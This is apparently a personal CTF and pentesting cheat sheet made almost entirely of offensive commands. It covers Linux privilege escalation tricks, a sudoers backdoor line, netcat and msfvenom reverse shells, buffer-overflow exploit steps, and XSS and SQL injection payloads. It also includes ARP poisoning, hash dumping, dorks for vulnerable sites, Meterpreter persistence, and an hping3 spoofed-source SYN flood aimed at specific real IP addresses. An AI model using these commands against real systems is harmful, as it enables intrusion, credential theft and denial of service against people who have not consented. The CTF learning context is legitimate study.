## I used to forget stuff when doing CTF and things. I build these notes little by little to help me remember things I failed to remember. This note doesn't contain everything. Nevertheless, I hope it can be useful. 

**Box Notes**
1. Always check /etc/sudoers.d
2. Always check /etc/crontab or cd to /etc/cron.d
but dont trust /etc/crontab >:(
3. Always check version, kernel release, and stuff
```
cat /etc/*release
uname -a 
cat /etc/issue 
```
5. find / -perm -u=s -type f 2>/dev/null >>> to find some suid misconf
6. find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
7. find / -user root -perm -4000 -print 2>/dev/null
8. find / -type f -perm -04000 -ls 2>/dev/null (same like -u=s)

9. IF there's motd.d executed once connected, always check the permission of the /etc/motd.d see if u can write on it

10. when u got privesc thing just 
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet or
- `chmod u+s /bin/bash` as root, bash -p, or 
- `echo "[username] ALL=(ALL:ALL) ALL" >> /etc/sudoers;`
and on and on and on

11. linpeas linenum pspy name ur shits
12. Always check `cat ~/.*history | less` or just `history`
13. Use ysoserial to exploit java deserialization to get revershell or RCE (payload have to be in a file). Then use it or encode it first, what ever.
14. Remember CVE-2019-13287 (ALL, !root) /bin/bash >>> sudo -u#-1 /bin/bash
15. `.conf` file may contain something. (usually in /etc/apache2)
16. Stuck? Bruteforce with no end? Generate your own wordlist with cewl! Example: cewl http://10.10.10.191/ -w customwordlist.txt -m 6
17. 
- SMB enum >>> smbclient -L //[IP](its_the_same_like_--list=[IP]), and continue with the shares name `smbclient //[IP]/[sharename]`
- Just `smbclient -h` tbh
18. rpcclient --user=[username] [target-ip] -W [forest name]
19. Check cdata
20. Port 11211 is memcached server >>> https://www.hackingarticles.in/penetration-testing-on-memcached-server/
21. Always check `netstat -tulpn`
22. Enum smtp with telnet.
23. On windows, always check `whoami /priv` and find recent vulnerability.



**Capabilities**
https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

1. The way capabilities work is like SUID. It allows us to execute some function as root. Always check capabilities >>> getcap -r / 2>/dev/null
Keep an eye on cap_setuid+ep or setuid capabilities mostly.

## `/usr/bin/python3 = cap_setuid+ep`
We can just exploit that like `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")`

## `/usr/bin/perl = cap_setuid+ep`
Same like python, we can just do this `/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'`

## `/usr/bin/openssl = cap_setuid+ep`
We can create our own OpenSSL engine in C (<openssl/engine.h>), and use the SETUID capabilities (<unistd.h>)
Use the `openssl_setuid.c`

## `/usr/bin/tar = cap_dac_read_search+ep`
In short, we can use tar as root, so we can:
- tar the shadow > `/usr/bin/tar cvf shadow.tar /etc/shadow`
- extract the tar > `/usr/bin/tar xvf shadow.tar`
- see the inside > `cat etc/shadow`



**Gdbuss Root SSH Privesc**
1. gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_rsa true
https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/



**Chisel**
- If there's an attempt to SSH or something outside the docker container we are in and we cant access it. We need to socks proxy stuff it somehow.
- If we are trapped inside a docker container.

./chisel server --help
./chisel client --help

On our machine:
1. `sudo ~/tools/chisel server -p [Anyport] --reverse`

On the target Machine:
2. Transfer the chisel client
3. chmod +x chisel
4. ./chisel client [Our IP]:[Our Port] R:[Localport usually 22]:[The IP we want to proxy]:[The Service port we want to proxy]
R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
IF error, or stuff, just remove the local interface



**LOGS**
1. Always check /var/log/auth.log
2. Always check /var/log/apache2/access.log


**Internal**
1. Fast internal network scan
ex: curl http://[IP]:[Port range with the brackets]
- curl http://10.10.11.88:[0-65353]


**Wild card privesc**
### When there's a script using `*`, for example to backup stuff. Usually in cronjob.
Example: 
In a cronjob there's 
`/usr/local/bin/backup.sh` with this inside it
```
cd /home/user
tar czf /tmp/backup.tar.gz *
```
We can exploit that function to execute all the script in the directory (in this case /home/user) to escalate our privilege
1. Create a script file in the /home/user for example
echo "chmod +s /bin/bash" > exploit.sh
2. touch /home/user/--checkpoint=1
3. touch /home/user/--checkpoint-action=exec=sh\ exploit.sh
4. The touch and checkpoint command will make the tar command to execute the exploit.sh which allow us to escalate our privillege



**NFS2049**
1. showmount -e <remote-ip>
2. sudo mkdir /mnt/[name_of_the_mount]
3. sudo mount <remote-ip>:[shared_directory] /mnt/[name_of_the_mount]



**Impacket**
1. GetNPUsers.py >> This script can check of the usernames are existing and if they have Kerberos pre-authentication enabled

Usage: `python3 ~/scripts/impacket/examples/GetNPUsers.py [Forest]/ -usersfile [List of username file] -outputfile hash.txt -dc-ip [TARGET IP] -format john` >> format john so then u can crack the existing user hash

2. secretsdump.py >> Performs various techniques to dump hashes from the remote machine without executing any agent there. (SAMHashes, LSASecrets, NTDSHashes)

Example: 
`python3 ~/scripts/impacket/examples/secretsdump.py -ntds ntds.dit -system system.bak LOCAL`
`~/scripts/impacket/examples/secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>`
and many more.. go research on it.

[] >>> means optional command



**PATH Privesc**
### When it is not run directly, example:
/usr/bin/cat >>> cant
cat >>> can
1. cd /tmp
2. echo "/bin/bash" > [the misconfigured]
3. chmod +x [the misconfigured]
4. export PATH=/tmp:$PATH
5. Execute the misconfigured binary

# In Bash versions < 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
/usr/sbin/service >>> can
1. function /usr/sbin/service { /bin/bash -p; }
2. export -f /usr/sbin/service
3. Execute the misconfigured binary

### Does not have to be in /tmp, u can create your own folder



**How to create environment variable**
1. export [varname]=[value]
2. echo $[varname]



**XSS**
1. <detail/open/ontoggle=alert()>
2. 𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()

https://aem1k.com/aurebesh.js/#%3Cscript%3Eak

3. ..



**Little SQLI**
1. 'UNION SELECT 1,table_name,column_name FROM information_schema.columns -- -
2. 'UNION SELECT 1,group_concat(sql),3 FROM sqlite_master -- -
3. 'UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata -- - (get list of databases)
4. 'UNION SELECT group_concat(column_name),group_concat(table_name),3,4 from information_schema.columns WHERE table_schema='[db_name]'-- -



**Bufferoverflow**

## Peda https://myexperiments.io/exploit-basic-buffer-overflow.html
1. i func
find the function address we want to jump to
2. gdb [binary]
3. pattern create [value]
4. run '[the pattern]'
see the EIP value
5. pattern offset [EIP value]
we got the exact overflow value
6. python -c "print 'A' * [exact_value] + '[target address]'"
target address usually little endian
ex: 0x80484c6 >>>> \xc6\x84\x04\x08

## Using msf-pattern and BOP usual case
1. Predict the size
2. msf-pattern_create.rb -l [the size] >>> we got the address
3. msf-pattern_offset.rb -l [the size] -q [the EIP value] >>> we got the exact overflow value
4. Find badchars (missing hex from the badchars list) >>> payload + badchars
5. Find unprotected module, use `!mona modules` or smth
6. Find jmp pointer (ESP) on unprotected module, use `!mona find -s "\xff\xe4" -m [unprotected dll or exe]`
7. Got the ESP address, change it to little endian format
ex: 0x080414C3 >>> \xC3\x14\x04\x08
8. Overwrite the EIP with the little endian ESP address
9. Generate shellcode with the badchars >>> overwrite with shellcode to gain remote access
Example:
msfvenom -p windows/shell_reverse_tcp LHOST=[yourip] LPORT=[yourport] EXITFUNC=thread -f c -a x86 -b "\x00"

encode it with shikata_ga_nai if u want
-f >>> the output file language
-a >>> the architecture
-b >>> bad chars

10. Dont forget to add NOPS (\x90) on final payload ('\x90' * 32 or more or less).
11. Final payload formation: [Payload] + [ESP] + [NOPS] + [SHELLCODE]
Example:
`payload = b"A"*146 + b"\xC3\x14\x04\x08" + b"\x90" * 20 + shellcode`



**Fix your terminal**
1. python3 -c 'import pty;pty.spawn("/bin/bash");'
2. export TERM=xterm >>> so you can clear
3. ctrl + z >>> background
4. stty raw -echo
5. fg



**CTF Tools**
1. Forensics >> exiftool, volatility, zsteg, stegsolve, stegcracker, steghide
2. Way Back Machine can see everything, not only dead websites



**SSH with id_rsa**
1. chmod 600 id_rsa >>> for ours and ours alone 
2. ssh -i id_rsa [user]@[ip]



**Dorking**
1. Possible SQLi target >>> inurl:"product.php?id=" & intext:"You have an error in your SQL syntax"
2. Open FTP >>> "intitle: index of" inurl:ftp



**ARP**
Enable port forwarding
## echo 1 > /proc/sys/net/ipv4/ip_forward
### Poisoning
1. sudo arpspoof -i [interface] -t [target_ip] [gateway_ip]
2. sudo arpspoof -i [interface] -t [gateway] [target_ip]
Or just langsung pake -r (both direction)
1. sudo arpspoof -i [interface] -t [target_ip] -r [gateway_ip]

### Sniff
1. After poisoning, sniff packets with wireshark
2. Or just use bettercap and do this all automaticly tbh.



**Wireshark**
1. [FILTER] && [FILTER] && [FILTER] >>> Filtering stuff
Ex: ip.src == [IP] && http 
2. Follow the stream~



**Crunch**
## Generate wordlists with Crunch
Ex: 
Default charset is lowecase alphabet
- crunch [min-length] [max-lenth] ([charset] [option]) >>> optional
- crunch 2 4
- crunch 1 2 soni siu sia >>> min and max length is required but in this case wont be used.
- crunch 6 6 -t d%d%d% -p rara riri ruru >> d is the word location. The length will be more than 6. When we use -p length is just a formality/
- etc.. just read the man

## Important Options

Pattern (-t)
@ -> lowercase character
, -> uppercase character
% -> numbers
^ -> symbol
- crunch 7 7 -t @,%^123 -o wordlist.txt (notice that min-max length have to be the same as pattern length)

Charset (-f)
- Lookat the preset charsets in /usr/share/crunch/charset.lst
- crunch 2 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o ww.txt


**Random**
1. hashcat --example-hash >> or just visit the one in the web
<hash>:<salt>
2. diff -y [file1] [file2] >> compare file side by side
3. binary mode FTP is better
4. watch -n 0 [stuff you want to watch]
ex = watch -n 0 ls -la /bin/bash
5. when we have admin in windows, and meterpreter shell, try
	`run post/windows/manage/enable_rdp `
	and conenct rdp. Fun commands
6. Veil msfconsole combo
Generate
msfconsole --resource /var/lib/veil/output/handlers/[yourbackdoor]
7. nc -e /bin/bash [ip] [port]
8. from binascii import unhexlify >> unhexlify to convert hex to string
9. hping3 DOS
	hping3 -S [host] -p ++[initial_port] >>> Port status discovery (open/not)
	hping3 -S [host] -p [port] -a [disguised_host] --flood
	hping3 -S [host] -p [port] -a [disguised_host] --flood --rand-source

	example: sudo hping3 -S 45.33.32.156 -p 80 -a 173.203.36.104 --flood --rand-source -V >>> -V for verbose
10. alias cd='rm -rf' >> LOL DONT DO THIS
11. ping and look at the TTL to find the target OS.
12. Rsa stuff
```
Public Key Pair: (23, 37627)                                                                          
Private Key Pair: (61527, 37627)

Public Key: ({e}, {n})
Private Key: ({d}, {n})

e = 23
d = 61527
n = 37627
```


**OSINT**
1. Twitter is your friend
2. Wayback machine is a thing
3. Just use frickin sherlock if you have a username >>> python3 sherlock/ `username`
https://whatsmyname.app/
https://namecheckup.com/
https://namechk.com/
https://scylla.sh/api (Breach database) (ex = email:rudolphthered@hotmail.com, password:spygame, [what to search]:[the data])



**Tricks**
1. [command name]() { cd "$@" && ls; } >> Auto ls when cd
ex:
cdls(){ cd "$@" && ls; }
i prefer just c
2. .bashrc is the file that's executed first when you logged in to SSH, to login without activiting it do 
`ssh -t [username]@[ip] /bin/sh`
3. Automatc meterpreter persistance
https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
4. PYTHONENV is the python environment variable, SO IF WE CHANGE IT THE IMPORT LOCATION ALSO CHANGES
